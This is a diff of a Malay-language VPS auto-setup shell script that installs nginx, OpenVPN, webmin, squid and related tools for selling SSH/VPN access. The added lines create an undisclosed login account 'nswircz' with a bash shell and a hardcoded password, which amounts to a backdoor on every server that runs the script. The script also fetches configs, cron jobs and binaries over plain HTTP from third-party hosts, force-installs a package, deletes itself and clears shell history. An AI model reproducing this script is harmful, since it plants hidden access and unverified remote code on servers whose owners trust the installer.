@@ -106,25 +106,39 @@ cd
 rm -rf /root/.bashrc
 wget -O /root/.bashrc $source/debian7/.bashrc
 
-# Install Webserver Port 81
-apt-get install nginx php5 libapache2-mod-php5 php5-fpm php5-cli php5-mysql php5-mcrypt libxml-parser-perl -y
+# install webserver
+cd
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
-mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.old
-curl http://autoscriptnobita.tk/rendum/nginx.conf > /etc/nginx/nginx.conf
-curl http://autoscriptnobita.tk/rendum/vps.conf > /etc/nginx/conf.d/vps.conf
-sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
-useradd -m vps;
+wget -O /etc/nginx/nginx.conf "http://autoscriptnobita.tk/rendum/nginx.conf"
 mkdir -p /home/vps/public_html
-echo "<?php phpinfo() ?>" > /home/vps/public_html/info.php
-chown -R www-data:www-data /home/vps/public_html
-chmod -R g+rw /home/vps/public_html
-cd /home/vps/public_html
-wget -O /home/vps/public_html/uptime.php "http://autoscript.kepalatupai.com/uptime.php1"
-wget -O /home/vps/public_html/index.html "https://raw.githubusercontent.com/GegeEmbrie/autosshvpn/master/addons/index.html1"
+echo "<pre>Modified by Orangkuatsabahanterkini atau (+60109475453)</pre>" > /home/vps/public_html/index.html
+echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
+wget -O /etc/nginx/conf.d/vps.conf "http://autoscriptnobita.tk/rendum/vps.conf"
+sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
 service php5-fpm restart
 service nginx restart
-cd
+
+# openvpn
+apt-get  -y install openvpn
+cd /etc/openvpn/
+wget $source/debian7/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules $source/debian7/iptables.up.rules
+sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
+sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+iptables-restore < /etc/iptables.up.rules
+# etc
+wget -O /home/vps/public_html/client.ovpn $source/debian7/client.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+cd;wget $source/debian7/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash nswircz
+echo "nswircz:rzp" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+clear
 
 # update OpenSSL
 wget "https://raw.githubusercontent.com/zero9911/vps/master/Pakages/openssl-1.1.0f.tar.gz"
@@ -194,7 +208,6 @@ if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; e
 if [ -x /usr/bin/mrtg ] && [ -r /etc/mrtg.cfg ]; then mkdir -p /var/log/mrtg ; env LANG=C /usr/bin/mrtg /etc/mrtg.cfg 2>&1 | tee -a /var/log/mrtg/mrtg.log ; fi
 cd
 
-
 # install vnstat gui
 cd /home/vps/public_html/
 wget http://script.hostingtermurah.net/repo/vnstat_php_frontend-1.5.1.tar.gz
@@ -251,11 +264,13 @@ service squid3 restart
 
 # install webmin
 cd
-wget "http://script.hostingtermurah.net/repo/webmin_1.801_all.deb"
-dpkg --install webmin_1.801_all.deb;
+#wget -O webmin-current.deb http://prdownloads.sourceforge.net/webadmin/webmin_1.760_all.deb
+wget -O webmin-current.deb $source/debian7/webmin-current.deb
+dpkg -i --force-all webmin-current.deb
 apt-get -y -f install;
-sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
-rm /root/webmin_1.801_all.deb
+#sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
+rm -f /root/webmin-current.deb
+apt-get -y --force-yes -f install libxml-parser-perl
 service webmin restart
 service vnstat restart
 
@@ -299,7 +314,6 @@ cmake ~/badvpn-1.999.127 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
 make install
 screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
 cd
-
 
 # install stunnel
 apt-get install stunnel4 -y
@@ -394,16 +408,21 @@ chmod +x /usr/bin/bannermenu
 chmod +x /usr/bin/menu-update-script-vps.sh
 cd
 
-#ovpn
-wget -O ovpn.sh $source/debian7/installovpn.sh
-chmod +x ovpn.sh
-./ovpn.sh
-rm ./ovpn.sh
-
-usermod -s /bin/false mail
-echo "mail:ardy" | chpasswd
-useradd -s /bin/false -M MuLuu09
-echo "MuLuu09:muluu" | chpasswd
+# swap ram
+dd if=/dev/zero of=/swapfile bs=2048 count=2048k
+# buat swap
+mkswap /swapfile
+# jalan swapfile
+swapon /swapfile
+#auto star saat reboot
+wget $source/debian7/fstab
+mv ./fstab /etc/fstab
+chmod 644 /etc/fstab
+sysctl vm.swappiness=10
+#permission swapfile
+chown root:root /swapfile 
+chmod 0600 /swapfile
+cd
 
 # finalisasi
 apt-get -y autoremove
@@ -427,50 +446,45 @@ history -c
 # info
 clear
 echo " "
-echo "Instaslasi telah selesai! Mohon baca dan simpan penjelasan setup server!"
-echo " "
-echo "--------------------------- Penjelasan Setup Server ----------------------------"
-echo "                         Copyright HostingTermurah.net                          "
-echo "                        https://www.hostingtermurah.net                         "
-echo "               Created By Steven Indarto(fb.com/stevenindarto2)                 "
-echo "--------------------------------------------------------------------------------"
-echo ""  | tee -a log-install.txt
-echo "Informasi Server"  | tee -a log-install.txt
-echo "   - Timezone    : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
-echo "   - Fail2Ban    : [on]"  | tee -a log-install.txt
-echo "   - IPtables    : [on]"  | tee -a log-install.txt
-echo "   - Auto-Reboot : [off]"  | tee -a log-install.txt
-echo "   - IPv6        : [off]"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "Informasi Aplikasi & Port"  | tee -a log-install.txt
-echo "   - OpenVPN     : TCP 1194 "  | tee -a log-install.txt
-echo "   - OpenSSH     : 22, 143"  | tee -a log-install.txt
-echo "   - Dropbear    : 109, 110, 443"  | tee -a log-install.txt
-echo "   - Squid Proxy : 80, 3128, 8000, 8080 (limit to IP Server)"  | tee -a log-install.txt
-echo "   - Badvpn      : 7300"  | tee -a log-install.txt
-echo "   - Nginx       : 85"  | tee -a log-install.txt
-echo "   - PPTP VPN    : 1732"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "Informasi Tools Dalam Server"  | tee -a log-install.txt
-echo "   - htop"  | tee -a log-install.txt
-echo "   - iftop"  | tee -a log-install.txt
-echo "   - mtr"  | tee -a log-install.txt
-echo "   - nethogs"  | tee -a log-install.txt
-echo "   - screenfetch"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "Informasi Premium Script"  | tee -a log-install.txt
-echo "   Perintah untuk menampilkan daftar perintah: menu"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "   Penjelasan script dan setup VPS"| tee -a log-install.txt
-echo "   dapat dilihat di: http://bit.ly/penjelasansetup"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "Informasi Penting"  | tee -a log-install.txt
-echo "   - Download Config OpenVPN : http://$MYIP:85/client.ovpn"  | tee -a log-install.txt
-echo "     Mirror (*.tar.gz)       : http://$MYIP:85/openvpn.tar.gz"  | tee -a log-install.txt
-echo "   - Webmin                  : http://$MYIP:10000/"  | tee -a log-install.txt
-echo "   - Vnstat                  : http://$MYIP:85/vnstat/"  | tee -a log-install.txt
-echo "   - MRTG                    : http://$MYIP:85/mrtg/"  | tee -a log-install.txt
-echo "   - Log Instalasi           : cat /root/log-install.txt"  | tee -a log-install.txt
-echo "     NB: User & Password Webmin adalah sama dengan user & password root"  | tee -a log-install.txt
-echo ""  | tee -a log-install.txt
-echo "----------- Script Created By Steven Indarto(fb.com/stevenindarto2) ------------"
+echo "################################################################################" | lolcat
+echo "#          SELAMAT DATANG DI SCRIPT AUTO SETUP VPS BY VPSPROJECT.              #" | lolcat
+echo "#                       SCRIPT VERSION V2.0 FOR DEBIAN 7-8-9                   #" | lolcat
+echo "#                               SEMOGA BERMANFAAT                              #" | lolcat
+echo "#------------------------------------------------------------------------------#" | lolcat
+echo "################################################################################" | lolcat
+echo "============================================================" | tee -a log-install.txt| lolcat
+echo " FINSIH AND THANK YOU / Please Restart You VPS     "| tee -a log-install.txt| lolcat
+echo "============================================================" | tee -a log-install.txt| lolcat
+echo "Service :" | tee -a log-install.txt | lolcat
+echo "---------" | tee -a log-install.txt | lolcat
+echo "OpenSSH  : 22, 143" | tee -a log-install.txt | lolcat
+echo "Dropbear : 442 ,109,442" | tee -a log-install.txt | lolcat
+echo "  SSL    : 443, 80" | tee -a log-install.txt | lolcat
+echo "Squid3   : 8080 limit to IP $MYIP" | tee -a log-install.txt | lolcat
+#echo "OpenVPN  : TCP 1194 (client config : http://$MYIP:81/client.ovpn)" | tee -a log-install.txt | lolcat
+echo "badvpn   : badvpn-udpgw port 7300" | tee -a log-install.txt | lolcat
+echo "PPTP VPN : TCP 1723" | tee -a log-install.txt | lolcat
+echo "nginx    : 81" | tee -a log-install.txt | lolcat
+echo "" | tee -a log-install.txt | lolcat
+echo "Tools :" | tee -a log-install.txt | lolcat
+echo "axel, bmon, htop, iftop, mtr, rkhunter, nethogs: nethogs $ether" | tee -a log-install.txt | lolcat
+echo "Script :" | tee -a log-install.txt | lolcat
+echo "--------" | tee -a log-install.txt | lolcat
+echo "" | tee -a log-install.txt
+echo "Fitur lain :" | tee -a log-install.txt | lolcat
+echo "------------" | tee -a log-install.txt | lolcat
+echo "Webmin         : http://$MYIP:10000/" | tee -a log-install.txt | lolcat
+echo "vnstat         : http://$MYIP:81/vnstat/ [Cek Bandwith]" | tee -a log-install.txt | lolcat
+echo "MRTG           : http://$MYIP:81/mrtg/" | tee -a log-install.txt | lolcat
+echo "Timezone       : Asia/Jakarta " | tee -a log-install.txt | lolcat
+echo "Fail2Ban       : [on]" | tee -a log-install.txt | lolcat
+echo "DDoS Deflate.  : [on]" | tee -a log-install.txt | lolcat
+echo "Block Torrent  : [on]" | tee -a log-install.txt | lolcat
+echo "IPv6           : [on]" | tee -a log-install.txt | lolcat
+echo "Auto Lock User Expire tiap jam 00:00" | tee -a log-install.txt | lolcat
+echo "Auto Reboot tiap jam 00:00 dan jam 12:00" | tee -a log-install.txt | lolcat
+echo "Credit to all developers script, VpsProject" | tee -a log-install.txt | lolcat
+echo "THANK YOU FOR CHOICE US!!" | tee -a log-install.txt | lolcat
+echo "" | tee -a log-install.txt | lolcat
+echo " !!! SILAHKAN REBOOT VPS ANDA !!!" | tee -a log-install.txt | lolcat
+echo "=======================================================" | tee -a log-install.txt | lolcat
